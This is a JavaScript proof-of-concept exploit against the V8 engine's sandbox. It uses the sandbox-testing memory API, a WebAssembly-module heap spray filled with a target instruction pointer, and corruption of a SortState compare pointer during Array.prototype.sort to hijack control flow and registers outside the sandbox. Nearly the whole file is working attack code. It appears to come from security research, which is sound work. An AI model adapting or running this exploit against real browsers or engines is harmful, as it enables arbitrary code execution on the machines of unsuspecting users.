// --sandbox-testing
const kHeapObjectTag = 1;
const kSmiTagSize = 1;
const kSortStateMap = 0x1a8d;
const kSortStateSortComparePtrOffset = 0x14;
let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
function getPtr(obj) {
  return Sandbox.getAddressOf(obj) + kHeapObjectTag;
}
function getField(obj, offset) {
  return memory.getUint32(obj + offset - kHeapObjectTag, true);
}
function setField(obj, offset, value) {
  memory.setUint32(obj + offset - kHeapObjectTag, value, true);
}
function gc() {
  new ArrayBuffer(0x7fe00000);
}
function findObject(start, needle) {
  function match() {
    for (let k = 0; k < needle.length; ++k) {
      if (getField(start, k * 4) != needle[k]) return false;
    }
    return true;
  }
  while (!match()) start += 4;
  return start;
}

// target RIP
let TARGET = 0x42424242c0d3n;

// setup heap spray of 0x8000000
console.log(`[*] spraying...`);
let spray_total = 0x8000000;
let spray_buf = new ArrayBuffer(0x800000);
try {   // bump mmap_threshold to max
  new WebAssembly.Module(spray_buf);
} catch {}

let spray_buf_u8 = new Uint8Array(spray_buf);
spray_buf_u8.set([0,97,115,109,1,0,0,0,0,243,255,255,3,0]);
new BigUint64Array(spray_buf).fill(TARGET, 4, 0x800000 / 8);

let spray_modules = [];
for (let i = 0; i < spray_total / spray_buf.byteLength; i++) {
  spray_buf_u8[0xf] = i;
  spray_modules.push(new WebAssembly.Module(spray_buf));
}

// create object to be sorted
gc();
let obj = new Object();
obj.length = 2;
Object.defineProperties(obj, {
  0: {
    get() {
      // SortState created, egghunt & corrupt function index to target
      console.log(`[*] get [0]`);
      let pobj = getPtr(obj);
      let pss = findObject(pobj, [kSortStateMap]);
      console.log(`[+] SortState = ${pss.toString(16)}`);
      setField(pss, kSortStateSortComparePtrOffset, (spray_total / 2 / 8) << kSmiTagSize);
      return 0x13370000 >> kSmiTagSize;       // controlled in-sbx rcx, r8
    },
    set(value) {
      console.log(`[*] set [0] = ${value}`);
    }
  },
  1: {
    get() {
      console.log(`[*] get [1]`);
      return 0x14470000 >> kSmiTagSize;       // controlled in-sbx rbx, r9
    },
    set(value) {
      console.log(`[*] set [1] = ${value}`);
    }
  },
});

Array.prototype.sort.apply(obj);
